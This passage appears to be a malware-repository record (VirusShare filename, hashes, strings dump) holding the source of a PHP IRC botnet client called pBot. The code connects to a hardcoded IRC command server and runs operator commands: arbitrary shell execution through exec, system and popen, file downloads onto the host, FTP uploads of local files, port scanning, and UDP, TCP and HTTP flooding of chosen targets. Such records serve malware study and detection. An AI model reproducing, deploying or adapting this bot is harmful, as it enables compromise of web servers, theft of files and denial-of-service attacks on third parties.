);\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tfclose( $fp );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ whois ] $htmldat\" );\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t}else{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ whois ] Error: $errstr\" );\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ whois ] Invalid params, use .whois <ip/host>\" );\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"upftp\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t//ftp://user:password@host.com\n\t\t\t\t\t\t\t\t\t\t\t\t$pftp = parse_url( $mcmd[1] );\n\t\t\t\t\t\t\t\t\t\t\t\t$file = $mcmd[2];\n\t\t\t\t\t\t\t\t\t\t\t\t$dest = $mcmd[3];\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\tif( empty( $pftp[ 'host' ] )\n\t\t\t\t\t\t\t\t\t\t\t\t\t|| empty( $pftp[ 'user' ] )\n\t\t\t\t\t\t\t\t\t\t\t\t\t|| empty( $pftp[ 'pass' ] )\n\t\t\t\t\t\t\t\t\t\t\t\t\t|| empty( $file )\n\t\t\t\t\t\t\t\t\t\t\t\t\t|| empty( $dest ) )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ upftp ] URL line invalid!\" );\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$conn_id = ftp_connect( $pftp[ 'host' ] );\n\t\t\t\t\t\t\t\t\t\t\t\t\t$login_result = ftp_login( $conn_id, $pftp[ 'user' ], $pftp[ 'pass' ] );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\tif( ( !$conn_id ) || ( !$login_result ) ) \n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ upftp ] FTP connection failed!\" );\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ upftp ] Connected to \".$pftp[ 'host' ].\" for user \".$pftp[ 'user' ] );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$upload = ftp_put( $conn_id, $dest, $file, FTP_BINARY );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tif( !$upload )\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ upftp ] FTP upload faled!\" );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ upftp ] FTP upload success!\" );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ upftp ] Uploaded '\".$file.\"' to '\".$dest.\"'\" );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"joinchan\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$channel = $mcmd[1];\n\t\t\t\t\t\t\t\t\t\t\t\t$key = $mcmd[2];\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ joinchan ] \".$channel.\" => \".$key );\n\t\t\t\t\t\t\t\t\t\t\t\t$this->join( $channel, $key );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"partchan\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ partchan ] \".$mcmd[1] );\n\t\t\t\t\t\t\t\t\t\t\t\t$this->send( \"PART \".$mcmd[1] );\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"getvuln\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$server_name = $_SERVER['SERVER_NAME'];\n\t\t\t\t\t\t\t\t\t\t\t\t$req_uri = $_SERVER['REQUEST_URI'];\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\tif( $server_name != \"localhost\" && $server_name != \"127.0.0.1\" )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\tif( strlen( $server_name ) && strlen( $req_uri ) )\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$vuln = \"http://\".$server_name.$req_uri;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ getvuln ] \".$vuln );\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"download\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\tif( count( $mcmd ) > 2 )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\tif( !$fp = fopen( $mcmd[ 2 ], \"w\" ) )\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ download ] Permission denied!\" );\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tif( !$get = file( $mcmd[ 1 ] ) )\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ download ] Download failed!\" );\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfor( $i=0; $i <= count( $get ); $i++ ) \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{ \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfwrite( $fp, $get[ $i ] ); \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ),\"[ download ] URL [\".$mcmd[ 1 ].\"] to [\".$mcmd[ 2 ].\"]\");\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tfclose( $fp );\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ download ] Invalid Parameters, idiot!\" );\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"pmsg\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$person = $mcmd[1];\n\t\t\t\t\t\t\t\t\t\t\t\t$text = substr( strstr( $msg, $mcmd[1] ), strlen( $mcmd[1] ) + 1 );\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ pmsg ] \".$person.\" => \".$text );\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $person, $text );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"pscan\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$host = $mcmd[1];\n\t\t\t\t\t\t\t\t\t\t\t\t$beginport = $mcmd[2];\n\t\t\t\t\t\t\t\t\t\t\t\t$endport = $mcmd[3];\n\t\t\t\t\t\t\t\t\t\t\t\t$open_ports = \"Open Port List for \".$host.\": \";\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\tfor($i = $beginport; $i < $endport; $i++)\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\tif( $this->scanport( $host, $i ) )\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$open_ports .= \"|\".$i;\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), $open_ports );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"software\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), $_SERVER[ 'SERVER_SOFTWARE' ] );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"snf\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$this->config[ 'nickform' ] = $mcmd[ 1 ];\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"Nickname format set to [ \".$mcmd[ 1 ].\" ]\" );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"randnick\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$this->set_nick();\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"unauth\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$this->remove_auth( $host );\n\t\t\t\t\t\t\t\t\t\t\t\t$this->privmsg( $this->get_chan( ), \"[ auth ] Logout [ \".$nick.\" ]\" );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\tcase \"urlbomb\":\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t$this->urlbomb( $mcmd[ 1 ], $mcmd[ 2 ], $mcmd[ 3 ] );\n\t\t\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t\t\t}\n                            \t\t\t\tcase \"udpflood\": \n\t\t\t\t\t\t\t\t\t\t\t{\n                               \t\t\t\t\tif( count( $mcmd ) > 3 ) \n                               \t\t\t\t\t{\n                                  \t\t\t\t\t$this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); \n                               \t\t\t\t\t} \n                            \t\t\t\t\tbreak; \n\t\t\t\t\t\t\t\t\t\t\t}\n                            \t\t\t\tcase \"tcpflood\": \n\t\t\t\t\t\t\t\t\t\t\t{\n                               \t\t\t\t\tif( count( $mcmd ) > 5 ) \n                               \t\t\t\t\t{ \n                                 \t\t\t\t\t$this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); \n                               \t\t\t\t\t} \n                            \t\t\t\t\tbreak; \n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t} \n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} \n\t\t\t\t\t\t\tbreak; \n\t\t\t\t\t\t} \n\t\t\t\t\t} \n\t\t\t\t} \n\t\t\t\t$old_buf = $this->buf; \n\t\t\t} \n\t\t\t$this->start(); \n\t\t}\n\t\t\n\t\tfunction scanport( $host, $port )\n\t\t{\n\t\t\tif( fsockopen( $host, $port, $e, $s ) )\n\t\t\t{\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\treturn 0;\n\t\t}\n\t\t\n\t\tfunction urlbomb( $host, $path, $times, $mode = 0 )\n\t\t{\n\t\t\tif( !isset( $host ) || !isset( $path ) || !isset( $times ) )\n\t\t\t\treturn;\n\t\t\t\n\t\t\t$this->privmsg( $this->get_chan( ), '[ urlbomb ] started! [ '.$host.'/'.$path.' ]' );\n\t\t\t\n\t\t\t$success = 0;\n\t\t\tfor( $i = 0; $i < $times; $i++ )\n\t\t\t{\n\t\t\t\t$fp = fsockopen( $host, 80, $errno, $errstr, 30 );\n\t\t\t\tif( $fp )\n\t\t\t\t{\n\t\t\t\t\t$out = \"GET /\".$path.\" HTTP/1.1\\r\\n\";\n\t\t\t\t\t$out .= \"Host: \".$host.\"\\r\\n\";\n\t\t\t\t\t$out .= \"Keep-Alive: 300\\r\\n\";\n\t\t\t\t\t$out .= \"Connection: keep-alive\\r\\n\\r\\n\";\n\t\t\t\t\tfwrite( $fp, $out );\n\n\t\t\t\t\tif( $mode != 0 )\n\t\t\t\t\t{\n\t\t\t\t\t\twhile(!feof($fp)){/*do nothing*/}\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tfclose( $fp );\n\t\t\t\t\t\n\t\t\t\t\t$success++;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t$this->privmsg( $this->get_chan( ), '[ urlbomb ] finished! [ '.$host.'/'.$path.' ][ success: '.$success.' ]' );\n\t\t}\n\t\t\n\t\tfunction udpflood( $host, $packetsize, $time ) \n\t\t{\n\t\t\t$this->privmsg( $this->get_chan( ),\"[ udpflood ] Started [\".$host.\"]\" ); \n\t\t\t$packet = \"\";\n\t\t\tfor($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }\n\t\t\t$timei = time();\n\t\t\t$i = 0;\n\t\t\twhile(time()-$timei < $time) \n\t\t\t{\n\t\t\t\t$fp=fsockopen(\"udp://\".$host,mt_rand(0,6000),$e,$s,5);\n\t\t\t\tfwrite($fp,$packet);\n\t\t\t\tfclose($fp);\n\t\t\t\t$i++;\n\t\t\t}\n\t\t\t$env = $i * $packetsize;\n\t\t\t$env = $env / 1048576;\n\t\t\t$vel = $env / $time;\n\t\t\t$vel = round($vel);\n\t\t\t$env = round($env);\n\t\t\t$this->privmsg( $this->get_chan( ),\"[ udpflood ] $env MB Sent / $vel MB/s \");\n\t\t}\n\t\t\n\t\tfunction tcpflood($host,$packets,$packetsize,$port,$delay) \n\t\t{ \n\t\t\t$this->privmsg( $this->get_chan( ),\"[\\2TcpFlood Started!\\2]\"); \n\t\t\t$packet = \"\"; \n\t\t\tfor($i=0;$i<$packetsize;$i++) \n\t\t\t\t$packet .= chr(mt_rand(1,256)); \n\t\t\t\n\t\t\tfor($i=0;$i<$packets;$i++) \n\t\t\t{ \n\t\t\t\tif(!$fp=fsockopen(\"tcp://\".$host,$port,$e,$s,5)) \n\t\t\t  \t{ \n\t\t\t\t\t$this->privmsg( $this->get_chan( ),\"[\\2TcpFlood\\2]: Error: <$e>\"); \n\t\t\t\t  \treturn 0; \n\t\t\t   \t} \n\t\t\t   \telse \n\t\t\t   \t{ \n\t\t\t\t\tfwrite($fp,$packet); \n\t\t\t\t\tfclose($fp); \n\t\t\t\t} \n\t\t\t   \tsleep($delay); \n\t\t\t} \n\t\t\t$this->privmsg( $this->get_chan( ),\"[\\2TcpFlood Finished!\\2]: Config - $packets for $host:$port.\"); \n\t\t}\n\t\t\n\t\tfunction send($msg) \n\t\t{ \n\t\t\tfwrite($this->conn,\"$msg\\r\\n\"); \n\t\t} \n\t\t\n\t\tfunction join($chan,$key=NULL) \n\t\t{ \n\t\t\t$this->send(\"JOIN $chan $key\"); \n\t\t} \n\t\t\n\t\tfunction privmsg($to,$msg)\n\t\t{\n\t\t\t$this->send(\"PRIVMSG $to :$msg\");\n\t\t}\n\t\t\n\t\tfunction notice($to,$msg)\n\t\t{\n\t\t\t$this->send(\"NOTICE $to :$msg\");\n\t\t}\n\t\t \n\t\t function set_nick() \n\t\t { \n\t\t\t$prefix = \"[C]\";\n\t\t\tif(isset($_SERVER['SERVER_SOFTWARE']))\n\t\t\t{ \n\t\t\t\tif( strstr( strtolower( $_SERVER[ 'SERVER_SOFTWARE' ] ), \"apache\" ) )\n\t\t\t\t\t$prefix = \"[A]\"; \n\t\t\t\telseif( strstr( strtolower( $_SERVER[ 'SERVER_SOFTWARE' ] ), \"iis\" ) ) \n\t\t\t\t\t$prefix = \"[I]\"; \n\t\t\t\telseif( strstr( strtolower( $_SERVER[ 'SERVER_SOFTWARE' ] ), \"xitami\" ) ) \n\t\t\t\t\t$prefix = \"[X]\"; \n\t\t\t\telse \n\t\t\t\t\t$prefix = \"[U]\"; \n\t\t\t}\n\t\t\t\n\t\t\tif( !$this->is_safe( ) )\n\t\t\t{\n\t\t\t\t$prefix .= \"[S]\";\n\t\t\t}\n\t\n\t\t\t$random_number = \"\";\n\t\t\tfor( $i = 0; $i < $this->config[ 'maxrand' ]; $i++ )\n\t\t\t{\n\t\t\t\t$random_number .= mt_rand( 0, 9 ); \n\t\t\t}\n\t\n\t\t\t$this->nick = sprintf( $prefix.$this->config[ 'nickform' ], $random_number );\n\t\t\t$this->send(\"NICK \".$this->nick);\n\t\t }\n\t\t \n\t\tfunction parse_url_s( $url )\n\t\t{\n\t\t\t$URLpcs = ( parse_url( $url ) );\n\t\t\t$PathPcs = explode( \"/\", $URLpcs['path'] );\n\t\t\t$URLpcs['file'] = end( $PathPcs );\n\t\t\tunset( $PathPcs[ key( $PathPcs ) ] );\n\t\t\t$URLpcs['dir'] = implode(\"/\",$PathPcs);\n\t\t\t\n\t\t\t$fileext = explode( '.', $URLpcs['file'] );\n\t\t\t\n\t\t\tif(count($fileext))\n\t\t\t{\n\t\t\t\t$URLpcs['file_ext'] = $fileext[ count( $fileext ) - 1 ];\n\t\t\t}\n\t\t\t\n\t\t\treturn ($URLpcs);\n\t\t}\n\t} \n\t\n\t$bot = new pBot; \n\t$bot->start(); \n\n?>"
    },
    "filename": "VirusShare_0b405ba1d19900c14fc2bc9b7ca51309",
    "filesize": 24756,
    "filetype": "PHP script, ASCII text",
    "hashes": {
        "md5": "0b405ba1d19900c14fc2bc9b7ca51309",
        "sha1": "9c54799465a1ca2818aade8100db3dba09f1e17e",
        "sha256": "c0bf5276f14c3c2f064b7dcd3c7ce79b5d2df3e3c5633e729738efbfeff90797"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<?php",
            "\tset_time_limit( 0 );",
            "\terror_reporting( 0 );",
            "ignore_user_abort(true);",
            "\techo \"Success!\";",
            "\tclass pBot ",
            "\t\tvar $using_encode = false;",
            "\t\tvar $config = array(",
            "\t\t\t'server' \t=> 'oishi.r00t.la',\t//server here (base64)",
            "\t\t\t'port'\t\t=> 6667,",
            "\t\t\t'chan'\t\t=> 'machine',\t\t//channel here (base64) DO NOT USE \"#\", \"#lazy\" = \"lazy\"",
            "\t\t\t'key'\t\t=> '',",
            "\t\t\t'nickform'\t=> 'machine%d',",
            "\t\t\t'identp'\t=> 'machine',",
            "\t\t\t'modes'\t\t=> '+p',",
            "\t\t\t'maxrand'\t=> 5,",
            "\t\t\t'cprefix'\t=> '.',",
            "\t\t\t'host'\t\t=> '*'",
            "\t\t);",
            "\t\tvar $admins = array",
            "\t\t( ",
            "\t\t\t'sherif' => 'd2f65a6de6c5d856d338bda0c9c60c06',",
            "\t\t);",
            "\t\tfunction auth_host( $nick, $password, $host )",
            "\t\t\t$admin_count = count( $this->admins );",
            "\t\t\tif( $admin_count > 0 )",
            "\t\t\t{",
            "\t\t\t\t$mpass = md5( $password );",
            "\t\t\t\tif( $this->admins[ $nick ] == $mpass )",
            "\t\t\t\t{",
            "\t\t\t\t\t$this->users[ $host ] = true;",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\telse",
            "\t\t\t{",
            "\t\t\t\t$this->users[ $host ] = true;",
            "\t\t\t}",
            "\t\tfunction is_authed( $host )",
            "\t\t\treturn isset( $this->users[ $host ] );",
            "\t\tfunction remove_auth( $host )",
            "\t\t\tunset( $this->users[ $host ] );",
            "\t\tfunction ex( $cfe )",
            "\t\t\t$res = '';",
            "\t\t\tif (!empty($cfe))",
            "\t\t\t{",
            "\t\t\t\tif(function_exists('class_exists') && class_exists('Perl'))",
            "\t\t\t\t{",
            "\t\t\t\t\t$perl = new Perl();",
            "\t\t\t\t\t$perl->eval( \"system('$cfe');\" );",
            "\t\t\t\t}",
            "\t\t\t\tif(function_exists('exec'))",
            "\t\t\t\t{",
            "\t\t\t\t\t@exec($cfe,$res);",
            "\t\t\t\t\t$res = join(\"\\n\",$res);",
            "\t\t\t\t}",
            "\t\t\t\telseif(function_exists('shell_exec'))",
            "\t\t\t\t{",
            "\t\t\t\t\t$res = @shell_exec($cfe);",
            "\t\t\t\t}",
            "\t\t\t\telseif(function_exists('system'))",
            "\t\t\t\t{",
            "\t\t\t\t\t@ob_start();",
            "\t\t\t\t\t@system($cfe);",
            "\t\t\t\t\t$res = @ob_get_contents();",
            "\t\t\t\t\t@ob_end_clean();",
            "\t\t\t\t}",
            "\t\t\t\telseif(function_exists('passthru'))",
            "\t\t\t\t{",
            "\t\t\t\t\t@ob_start();",
            "\t\t\t\t\t@passthru($cfe);",
            "\t\t\t\t\t$res = @ob_get_contents();",
            "\t\t\t\t\t@ob_end_clean();",
            "\t\t\t\t}",
            "\t\t\t\telseif(function_exists('proc_open'))",
            "\t\t\t\t{",
            "\t\t\t\t\t$res = proc_open($cfe);",
            "\t\t\t\t}",
            "\t\t\t\telseif(@is_resource($f = @popen($cfe,\"r\")))",
            "\t\t\t\t{",
            "\t\t\t\t\t$res = \"\";",
            "\t\t\t\t\twhile(!@feof($f)) { $res .= @fread($f,1024); }",
            "\t\t\t\t\t@pclose($f);",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\treturn $res;",
            "\t\tfunction is_safe( )",
            "\t\t\tif( ( @eregi( \"uid\", $this->ex( \"id\" ) ) ) || ( @eregi( \"Windows\", $this->ex( \"net start\" ) ) ) )",
            "\t\t\t{",
            "\t\t\t\treturn 0;",
            "\t\t\t}",
            "\t\t\treturn 1;",
            "\t\tfunction get_chan( )",
            "\t\t\tif( $this->using_encode )",
            "\t\t\t{",
            "\t\t\t\treturn '#'.base64_decode( $this->config[ 'chan' ] );",
            "\t\t\t}",
            "\t\t\telse",
            "\t\t\t{",
            "\t\t\t\treturn '#'.$this->config[ 'chan' ];",
            "\t\t\t}",
            "\t\tfunction start() ",
            "\t\t\tif( $this->using_encode )",
            "\t\t\t{",
            "\t\t\t\tif(!($this->conn = fsockopen(base64_decode($this->config['server']),$this->config['port'],$e,$s,30))) ",
            "\t\t\t\t{",
            "\t\t\t\t\t$this->start(); ",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\telse",
            "\t\t\t{",
            "\t\t\t\tif(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) ",
            "\t\t\t\t{",
            "\t\t\t\t\t$this->start(); ",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\t\t",
            "\t\t\t$ident = $this->config['prefix'];",
            "\t\t\t$alph = range(\"0\",\"9\");",
            "\t\t\tfor( $i=0; $i < $this->config['maxrand']; $i++ )",
            "\t\t\t{",
            "\t\t\t\t$ident .= $alph[rand(0,9)];",
            "\t\t\t}",
            "\t\t\t\t",
            "\t\t\tif( strlen( $this->config[ 'pass' ] ) > 0 )",
            "\t\t\t{",
            "\t\t\t\t$this->send( \"PASS \".$this->config[ 'pass' ] );",
            "\t\t\t}",
            "\t\t\t\t",
            "\t\t\t$this->send(\"USER \".$ident.\" 127.0.0.1 localhost :\".php_uname().\"\");",
            "\t\t\t$this->set_nick( );",
            "\t\t\t$this->main( );",
            "\t\tfunction main() ",
            "\t\t{ ",
            "\t\t\twhile(!feof($this->conn)) ",
            "\t\t\t{ ",
            "\t\t\t\t$this->buf = trim(fgets($this->conn,512)); ",
            "\t\t\t\t$cmd = explode(\" \",$this->buf); ",
            "\t\t\t\tif(substr($this->buf,0,6)==\"PING :\") ",
            "\t\t\t\t{ ",
            "\t\t\t\t\t$this->send(\"PONG :\".substr($this->buf,6)); ",
            "\t\t\t\t} ",
            "\t\t\t\tif(isset($cmd[1]) && $cmd[1] ==\"001\") ",
            "\t\t\t\t{ ",
            "\t\t\t\t\t$this->send(\"MODE \".$this->nick.\" \".$this->config['modes']); ",
            "\t\t\t\t\t",
            "\t\t\t\t\tif( $this->using_encode )",
            "\t\t\t\t\t{",
            "\t\t\t\t\t\t$this->join($this->get_chan( ),base64_decode($this->config['key']));",
            "\t\t\t\t\t}",
            "\t\t\t\t\telse",
            "\t\t\t\t\t{",
            "\t\t\t\t\t\t$this->join($this->get_chan( ),$this->config['key']);",
            "\t\t\t\t\t}",
            "\t\t\t\t\t",
            "\t\t\t\t\tif (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }",
            "\t\t\t\t\telse { $safemode = \"off\"; }",
            "\t\t\t\t\t$uname = php_uname(); ",
            "\t\t\t\t} ",
            "\t\t\t\tif(isset($cmd[1]) && $cmd[1]==\"433\") ",
            "\t\t\t\t{ ",
            "\t\t\t\t\t$this->set_nick(); ",
            "\t\t\t\t} ",
            "\t\t\t\tif($this->buf != $old_buf) ",
            "\t\t\t\t{ ",
            "\t\t\t\t\t$mcmd = array(); ",
            "\t\t\t\t\t$msg = substr(strstr($this->buf,\" :\"),2); ",
            "\t\t\t\t\t$msgcmd = explode(\" \",$msg); ",
            "\t\t\t\t\t$nick = explode(\"!\",$cmd[0]); ",
            "\t\t\t\t\t$vhost = explode(\"@\",$nick[1]); ",
            "\t\t\t\t\t$vhost = $vhost[1]; ",
            "\t\t\t\t\t$nick = substr($nick[0],1); ",
            "\t\t\t\t\t$host = $cmd[0]; ",
            "\t\t\t\t\tif($msgcmd[0]==$this->nick) ",
            "\t\t\t\t\t{ ",
            "\t\t\t\t\t\tfor($i=0;$i<count($msgcmd);$i++) ",
            "\t\t\t\t\t\t\t$mcmd[$i] = $msgcmd[$i+1]; ",
            "\t\t\t\t\t} ",
            "\t\t\t\t\telse ",
            "\t\t\t\t\t{ ",
            "\t\t\t\t\t\tfor($i=0;$i<count($msgcmd);$i++) ",
            "\t\t\t\t\t\t\t$mcmd[$i] = $msgcmd[$i]; ",
            "\t\t\t\t\t} ",
            "\t\t\t\t\tif(count($cmd)>2) ",
            "\t\t\t\t\t{ ",
            "\t\t\t\t\t\tswitch($cmd[1]) ",
            "\t\t\t\t\t\t{ ",
            "\t\t\t\t\t\t\tcase \"QUIT\":",
            "\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\tif( $this->is_authed( $host ) )",
            "\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t$this->remove_auth( $host );",
            "\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\tbreak; ",
            "\t\t\t\t\t\t\tcase \"PART\": ",
            "\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\tif( $this->is_authed( $host ) )",
            "\t\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t\t$this->remove_auth( $host );",
            "\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\tbreak; ",
            "\t\t\t\t\t\t\tcase \"PRIVMSG\": ",
            "\t\t\t\t\t\t\t\tif( ( substr($mcmd[0],0,1) == $this->config[ 'cprefix' ] ) ) ",
            "\t\t\t\t\t\t\t\t{ ",
